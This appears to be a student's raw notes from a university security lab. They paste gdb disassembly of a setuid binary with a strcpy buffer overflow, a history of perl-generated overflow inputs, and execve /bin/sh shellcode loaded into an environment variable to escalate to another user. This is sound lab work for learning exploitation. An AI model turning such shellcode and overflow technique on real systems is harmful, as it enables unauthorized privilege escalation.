# stuff

## setruid is called with 3ee - 1006 1,756  (0011 1110 1110) 

https://man7.org/linux/man-pages/man2/setreuid.2.html

This is user level3

level3:x:1006:1006:,,,:/home/level3:/bin/bash


Some poking around

total 28
drwxr-xr-x  2 level2     level2     4096 Jan 10 23:55 ./
drwx------ 17 level2     level2     4096 Jan 17 12:57 ../
-rwsr-xr-x  1 level3     level3     7672 Jan 10 23:33 helloVuln5*
-rw-r-----  1 level3     level3      133 Jan 10 23:34 oldpasswords.txt
-rw-r--r--  1 heisenburg heisenburg  613 Jan 10 23:33 README.enc
-rw-r--r--  1 level2     level2       23 Jan 10 23:55 shell.bin
level2@CS647:~/Desktop$ la
helloVuln5  oldpasswords.txt  README.enc  shell.bin
level2@CS647:~/Desktop$ cat oldpasswords.txt 
cat: oldpasswords.txt: Permission denied
level2@CS647:~/Desktop$ cat shell.bin
1�Ph//shh/bin����°
                 ̀level2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ cat README.enc 
pC����@����O�g<�,��.7

                     ^�b����K�mt̨^�g[,�q��l� @/�rb\ו����Yo��s!�ȷ*�9?��A��F���"�sW~,By��e]��+:1M%�
A�.JPbW�j�(<x���d�ɗ�yC�?jh�yS�r�>�"� ����B!)�i
k��|b#�s�}��h��r�_`�\�uh�(�.���vZ��n6_T�
�C8�çw�ֹo�~+]|0_]�(ܟ���YD��7�A|��i@+��~�<v�0��z�Б��FGmw�sF��E3,0�Jo�,%+���)�H�9�����}���+�,Sp��G�Z~6�.���H��!k����cs;�xp㪲ͼv pO묿���S���Ms�ݦ��j��[%e`~��l?���ڲlevel2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ gdb -q ./helloVuln5 
Reading symbols from ./helloVuln5...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x080486d4 <+0>:     lea    0x4(%esp),%ecx
   0x080486d8 <+4>:     and    $0xfffffff0,%esp
   0x080486db <+7>:     pushl  -0x4(%ecx)
   0x080486de <+10>:    push   %ebp
   0x080486df <+11>:    mov    %esp,%ebp
   0x080486e1 <+13>:    push   %ebx
   0x080486e2 <+14>:    push   %ecx
   0x080486e3 <+15>:    sub    $0x10,%esp
   0x080486e6 <+18>:    mov    %ecx,%ebx
   0x080486e8 <+20>:    movl   $0x8048888,-0xc(%ebp)
   0x080486ef <+27>:    call   0x80485fb <verifyLevelDecryption>
   0x080486f4 <+32>:    test   %eax,%eax
   0x080486f6 <+34>:    je     0x8048715 <main+65>
   0x080486f8 <+36>:    sub    $0x8,%esp
   0x080486fb <+39>:    pushl  -0xc(%ebp)
   0x080486fe <+42>:    push   $0x804891c
   0x08048703 <+47>:    call   0x8048430 <printf@plt>
   0x08048708 <+52>:    add    $0x10,%esp
   0x0804870b <+55>:    sub    $0xc,%esp
   0x0804870e <+58>:    push   $0x0
   0x08048710 <+60>:    call   0x8048480 <exit@plt>
   0x08048715 <+65>:    sub    $0x8,%esp
   0x08048718 <+68>:    push   $0x3ee
   0x0804871d <+73>:    push   $0x3ee
   0x08048722 <+78>:    call   0x80484a0 <setreuid@plt>
   0x08048727 <+83>:    add    $0x10,%esp
   0x0804872a <+86>:    mov    0x4(%ebx),%eax
   0x0804872d <+89>:    add    $0x4,%eax
   0x08048730 <+92>:    mov    (%eax),%eax
   0x08048732 <+94>:    sub    $0xc,%esp
   0x08048735 <+97>:    push   %eax
   0x08048736 <+98>:    call   0x8048651 <vulnFunction>
   0x0804873b <+103>:   add    $0x10,%esp
   0x0804873e <+106>:   mov    $0x0,%eax
   0x08048743 <+111>:   lea    -0x8(%ebp),%esp
   0x08048746 <+114>:   pop    %ecx
   0x08048747 <+115>:   pop    %ebx
   0x08048748 <+116>:   pop    %ebp
   0x08048749 <+117>:   lea    -0x4(%ecx),%esp
   0x0804874c <+120>:   ret    
End of assembler dump.
(gdb) Quit
(gdb) disassemble setreuid
Dump of assembler code for function setreuid@plt:
   0x080484a0 <+0>:     jmp    *0x804a02c
   0x080484a6 <+6>:     push   $0x40
   0x080484ab <+11>:    jmp    0x8048410
End of assembler dump.
(gdb) disassemble vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
   0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
   0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) x/8xw 0x804a02c
0x804a02c:      0x080484a6      0x080484b6      0x080484c6      0x00000000

Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
   0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
   0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
---Type <return> to continue, or q <return> to quit---
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    




   ./helloVuln5 $(perl -e 'print "A"x20')


   ./helloVuln5 $(perl -e 'print "A"x20' . "\x00"x8')


   main return: 0x0804873b

   ebx:  0xbfbf9700 (* parm1 --- "A")


0x bf bf 9d b4

0x bf ff fd b8


Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Fri Mar  4 09:46:40 2022 from 192.168.1.188
level2@CS647:~$ pwd
/home/level2
level2@CS647:~$ la
.bash_history  .bashrc  .compiz  Desktop  Documents  examples.desktop  .gnupg         .lesshst  Music     .profile  .ssh       .vboxclient-display-svga-x11.pid  .viminfo     .xsession-errors
.bash_logout   .cache   .config  .dmrc    Downloads  .gconf            .ICEauthority  .local    Pictures  Public    Templates  Videos                            .Xauthority  .xsession-errors.old
level2@CS647:~$ ls -alt
total 128
-rw-------  1 level2 level2 3969 Mar  4 10:04 .bash_history
drwx------ 17 level2 level2 4096 Mar  2 15:56 .
-rw-------  1 level2 level2   28 Mar  2 15:56 .lesshst
-rw-------  1 level2 level2 1103 Mar  2 15:01 .viminfo
drwx------ 20 level2 level2 4096 Mar  2 15:00 .config
drwxr-xr-x  2 level2 level2 4096 Feb 27 19:56 Desktop
drwx------ 15 level2 level2 4096 Feb 22 14:44 .cache
drwxr-xr-x 13 root   root   4096 Jan 11 00:43 ..
drwx------  2 level2 level2 4096 Jul 12  2021 .ssh
drwx------  3 level2 level2 4096 Jul 12  2021 .gnupg
-rw-r-----  1 level2 level2    6 Jul 12  2021 .vboxclient-display-svga-x11.pid
-rw-------  1 level2 level2 1900 Jul 12  2021 .ICEauthority
-rw-------  1 level2 level2 1383 Nov 17  2020 .xsession-errors
-rw-------  1 level2 level2  100 Nov 16  2020 .Xauthority
-rw-------  1 level2 level2  736 Nov 16  2020 .xsession-errors.old
drwx------  3 level2 level2 4096 Nov 16  2020 .compiz
drwx------  2 level2 level2 4096 Nov 16  2020 .gconf
drwx------  3 level2 level2 4096 Nov  6  2020 .local
drwxr-xr-x  2 level2 level2 4096 Nov  6  2020 Documents
drwxr-xr-x  2 level2 level2 4096 Nov  6  2020 Downloads
drwxr-xr-x  2 level2 level2 4096 Nov  6  2020 Music
drwxr-xr-x  2 level2 level2 4096 Nov  6  2020 Pictures
drwxr-xr-x  2 level2 level2 4096 Nov  6  2020 Public
drwxr-xr-x  2 level2 level2 4096 Nov  6  2020 Templates
drwxr-xr-x  2 level2 level2 4096 Nov  6  2020 Videos
-rw-r--r--  1 level2 level2   25 Nov  6  2020 .dmrc
-rw-r--r--  1 level2 level2  220 Nov  2  2020 .bash_logout
-rw-r--r--  1 level2 level2 3771 Nov  2  2020 .bashrc
-rw-r--r--  1 level2 level2 8980 Nov  2  2020 examples.desktop
-rw-r--r--  1 level2 level2  655 Nov  2  2020 .profile
level2@CS647:~$ cd Desktop/
level2@CS647:~/Desktop$ ll
total 32
drwxr-xr-x  2 level2     level2     4096 Feb 27 19:56 ./
drwx------ 17 level2     level2     4096 Mar  2 15:56 ../
-rwsr-xr-x  1 level3     level3     7672 Jan 10 23:33 helloVuln5*
-rw-r-----  1 level3     level3      133 Jan 10 23:34 oldpasswords.txt
-rw-rw-r--  1 level2     level2      935 Feb 27 19:56 README
-rw-r--r--  1 heisenburg heisenburg  613 Jan 10 23:33 README.enc
-rw-r--r--  1 level2     level2       23 Jan 10 23:55 shell.bin
level2@CS647:~/Desktop$ pwd
/home/level2/Desktop
level2@CS647:~/Desktop$ ls -alt
total 32
drwx------ 17 level2     level2     4096 Mar  2 15:56 ..
drwxr-xr-x  2 level2     level2     4096 Feb 27 19:56 .
-rw-rw-r--  1 level2     level2      935 Feb 27 19:56 README
-rw-r--r--  1 level2     level2       23 Jan 10 23:55 shell.bin
-rw-r-----  1 level3     level3      133 Jan 10 23:34 oldpasswords.txt
-rwsr-xr-x  1 level3     level3     7672 Jan 10 23:33 helloVuln5
-rw-r--r--  1 heisenburg heisenburg  613 Jan 10 23:33 README.enc
level2@CS647:~/Desktop$ pwd
/home/level2/Desktop
level2@CS647:~/Desktop$ hostname
CS647
level2@CS647:~/Desktop$ pwd
/home/level2/Desktop
level2@CS647:~/Desktop$ ls -alt
total 32
drwx------ 17 level2     level2     4096 Mar  2 15:56 ..
drwxr-xr-x  2 level2     level2     4096 Feb 27 19:56 .
-rw-rw-r--  1 level2     level2      935 Feb 27 19:56 README
-rw-r--r--  1 level2     level2       23 Jan 10 23:55 shell.bin
-rw-r-----  1 level3     level3      133 Jan 10 23:34 oldpasswords.txt
-rwsr-xr-x  1 level3     level3     7672 Jan 10 23:33 helloVuln5
-rw-r--r--  1 heisenburg heisenburg  613 Jan 10 23:33 README.enc
level2@CS647:~/Desktop$ echo $USER
level2
level2@CS647:~/Desktop$ history |grep perl
   49  ./helloVuln5 $(perl -e 'print 'A'x10)
   50  ./helloVuln5 $(perl -e 'print "A"x10')
   51  ./helloVuln5 $(perl -e 'print "A"x20')
   52  ./helloVuln5 $(perl -e 'print "A"x21')
   53  ./helloVuln5 $(perl -e 'print "A"x22')
   54  ./helloVuln5 $(perl -e 'print "A"x26')
   55  ./helloVuln5 $(perl -e 'print "A"x28')
   56  ./helloVuln5 $(perl -e 'print "A"x29')
   57  ./helloVuln5 $(perl -e 'print "A"x30')
   58  ./helloVuln5 $(perl -e 'print "A"x50')
   76  ./helloVuln5 $(perl -e 'print "A"x50')
   77  ./helloVuln5 $(perl -e 'print "A"x30')
   92  ./helloVuln5 $(perl -e 'print "A"x30')
  105  ./helloVuln5 $(perl -e 'print "A"x38')
  106  ./helloVuln5 $(perl -e 'print "A"x40')
  107  ./helloVuln5 $(perl -e 'print "A"x39')
  108  ./helloVuln5 $(perl -e 'print "A"x39 . "0"')
  109  ./helloVuln5 $(perl -e 'print "A"x39 . "\0"')
  110  ./helloVuln5 $(perl -e 'print "A"x39 . "\\0"')
  111  ./helloVuln5 $(perl -e 'print "A"x39 . "\0"')
  112  ./helloVuln5 $(perl -e 'print "A"x39 . "0"')
  113  ./helloVuln5 $(perl -e 'print "A"x39 . "\z00"')
  114  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"')
  115  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00" . "A"x10')
  116  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x4  . "A"x10')
  117  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x8  . "A"x10')
  118  ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x8')
  119  ./helloVuln5 $(perl -e 'print "A"x39')
  121  ./helloVuln5 $(perl -e 'print "A"x39')
  126  ./helloVuln5 $(perl -e 'print "A"x39')
  130  ./helloVuln5 $(perl -e 'print "A"x39')
  155  ./helloVuln5 $(perl -e 'print "A"x39')
  173  ./helloVuln5 $(perl -e 'print "A"x39')
  174  ./helloVuln5 $(perl -e 'print "A"x40')
  177  ./helloVuln5 $(perl -e 'print "A"x28')
  178  ./helloVuln5 $(perl -e 'print "A"x20')
  179  ./helloVuln5 $(perl -e 'print "A"x24')
  180  ./helloVuln5 $(perl -e 'print "A"x28')
  206  history |grep perl
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x8  . "A"x10')
-bash: warning: command substitution: ignored null byte in input
Input too large!
Program terminated.

level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x39 . "\x00"x1000  . "A"x10')
-bash: warning: command substitution: ignored null byte in input
Input too large!
Program terminated.

level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x38 . "\x00"x1000  . "A"x10')
-bash: warning: command substitution: ignored null byte in input
Input too large!
Program terminated.

level2@CS647:~/Desktop$ export shellcode=$(cat sh-bash: unexpected EOF while looking for matching `)'
-bash: syntax error: unexpected end of file
^C
level2@CS647:~/Desktop$ export shellcode=$(cat shell.bin)
level2@CS647:~/Desktop$ echo $shellcode
1�Ph//shh/bin����°
                 ̀
level2@CS647:~/Desktop$ env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.1.188 52579 192.168.1.229 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
OLDPWD=/home/level2
XDG_SESSION_ID=311
USER=level2
shellcode=1�Ph//shh/bin����°
                           ̀
QT_QPA_PLATFORMTHEME=appmenu-qt5
PWD=/home/level2/Desktop
HOME=/home/level2
SSH_CLIENT=192.168.1.188 52579 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/0
MAIL=/var/mail/level2
TERM=xterm
SHELL=/bin/bash
SHLVL=1
LOGNAME=level2
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/bus
XDG_RUNTIME_DIR=/run/user/1004
PATH=/home/level2/bin:/home/level2/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env
level2@CS647:~/Desktop$ env > env1
level2@CS647:~/Desktop$ gdb -q helloVuln5
Reading symbols from helloVuln5...(no debugging symbols found)...done.
(gdb) show env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.1.188 52579 192.168.1.229 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
OLDPWD=/home/level2
XDG_SESSION_ID=311
USER=level2
shellcode=1�Ph//shh/bin����°
                           ̀
QT_QPA_PLATFORMTHEME=appmenu-qt5
PWD=/home/level2/Desktop
HOME=/home/level2
SSH_CLIENT=192.168.1.188 52579 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/0
MAIL=/var/mail/level2
TERM=xterm
SHELL=/bin/bash
SHLVL=1
LOGNAME=level2
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/bus
XDG_RUNTIME_DIR=/run/user/1004
PATH=/home/level2/bin:/home/level2/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/gdb
LINES=77
COLUMNS=228
(gdb) show env > env2
Environment variable "> env2" not defined.
(gdb) unset 
environment      exec-wrapper     substitute-path  tdesc            
(gdb) unset environment LINES
(gdb) unset environment COLUMNS
(gdb) show env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.1.188 52579 192.168.1.229 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
OLDPWD=/home/level2
XDG_SESSION_ID=311
USER=level2
shellcode=1�Ph//shh/bin����°
                           ̀
QT_QPA_PLATFORMTHEME=appmenu-qt5
PWD=/home/level2/Desktop
HOME=/home/level2
SSH_CLIENT=192.168.1.188 52579 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/0
MAIL=/var/mail/level2
TERM=xterm
SHELL=/bin/bash
SHLVL=1
LOGNAME=level2
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/bus
XDG_RUNTIME_DIR=/run/user/1004
PATH=/home/level2/bin:/home/level2/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/gdb
(gdb) disass main
Dump of assembler code for function main:
   0x080486d4 <+0>:     lea    0x4(%esp),%ecx
   0x080486d8 <+4>:     and    $0xfffffff0,%esp
   0x080486db <+7>:     pushl  -0x4(%ecx)
   0x080486de <+10>:    push   %ebp
   0x080486df <+11>:    mov    %esp,%ebp
   0x080486e1 <+13>:    push   %ebx
   0x080486e2 <+14>:    push   %ecx
   0x080486e3 <+15>:    sub    $0x10,%esp
   0x080486e6 <+18>:    mov    %ecx,%ebx
   0x080486e8 <+20>:    movl   $0x8048888,-0xc(%ebp)
   0x080486ef <+27>:    call   0x80485fb <verifyLevelDecryption>
   0x080486f4 <+32>:    test   %eax,%eax
   0x080486f6 <+34>:    je     0x8048715 <main+65>
   0x080486f8 <+36>:    sub    $0x8,%esp
   0x080486fb <+39>:    pushl  -0xc(%ebp)
   0x080486fe <+42>:    push   $0x804891c
   0x08048703 <+47>:    call   0x8048430 <printf@plt>
   0x08048708 <+52>:    add    $0x10,%esp
   0x0804870b <+55>:    sub    $0xc,%esp
   0x0804870e <+58>:    push   $0x0
   0x08048710 <+60>:    call   0x8048480 <exit@plt>
   0x08048715 <+65>:    sub    $0x8,%esp
   0x08048718 <+68>:    push   $0x3ee
   0x0804871d <+73>:    push   $0x3ee
   0x08048722 <+78>:    call   0x80484a0 <setreuid@plt>
   0x08048727 <+83>:    add    $0x10,%esp
   0x0804872a <+86>:    mov    0x4(%ebx),%eax
   0x0804872d <+89>:    add    $0x4,%eax
   0x08048730 <+92>:    mov    (%eax),%eax
   0x08048732 <+94>:    sub    $0xc,%esp
   0x08048735 <+97>:    push   %eax
   0x08048736 <+98>:    call   0x8048651 <vulnFunction>
   0x0804873b <+103>:   add    $0x10,%esp
   0x0804873e <+106>:   mov    $0x0,%eax
   0x08048743 <+111>:   lea    -0x8(%ebp),%esp
   0x08048746 <+114>:   pop    %ecx
   0x08048747 <+115>:   pop    %ebx
   0x08048748 <+116>:   pop    %ebp
   0x08048749 <+117>:   lea    -0x4(%ecx),%esp
   0x0804874c <+120>:   ret    
End of assembler dump.
(gdb) break *0x08048736
Breakpoint 1 at 0x8048736
(gdb) disass vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
   0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
